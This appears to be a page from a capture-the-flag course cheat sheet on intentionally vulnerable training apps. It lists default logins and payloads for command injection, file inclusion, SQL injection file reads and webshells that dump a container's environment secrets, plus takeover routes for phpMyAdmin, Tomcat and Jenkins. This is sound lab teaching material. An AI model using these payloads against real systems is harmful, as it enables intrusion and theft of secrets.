# 08 — Known vulnerable apps & CMSs

| App | Default login | Note |
|---|---|---|
| DVWA | `admin` / `password` (run `/setup.php` → Create DB first) | [dvwa](dvwa.md) |
| bWAPP | `bee` / `bug` (`/install.php` first) | [bwapp](bwapp.md) |
| OWASP Juice Shop | register, or SQLi `' OR 1=1--` as admin | [juiceshop](juiceshop.md) |
| OWASP Mutillidae | none needed (`/set-up-database.php` if DB error) | [mutillidae](mutillidae.md) |
| WordPress | — find version → CVE → admin → code exec | [wordpress](wordpress.md) |

## Where's the flag in the training apps?
In the course deployment the per-student `FLAG` is an **environment variable of the container**
(the stock apps don't display it). So you need **command execution or arbitrary file read**:
```
command injection:  127.0.0.1; env | grep -i flag      (or: cat /proc/self/environ | tr '\0' '\n')
LFI:                ?page=/proc/self/environ           ?page=../../../../proc/1/environ
SQLi (FILE priv):   ' UNION SELECT LOAD_FILE('/proc/self/environ'),2-- -
upload webshell:    shell.php?c=env
```
Then grep: `grep -o 'flag{[^}]*}'`. If not in env, search the filesystem →
[find-the-flag](../11-post-exploitation/find-the-flag.md). Juice Shop is Node — see its note.

Other common CMS/apps: Joomla (`joomscan`, `/administrator/`), Drupal (`droopescan`,
Drupalgeddon), phpMyAdmin (default `root:` empty → SQL `INTO OUTFILE` webshell), Tomcat
(`/manager/html` `tomcat:tomcat` → WAR upload), Jenkins (`/script` Groovy console). Always:
[06-cve-research](../00-start/06-cve-research.md).
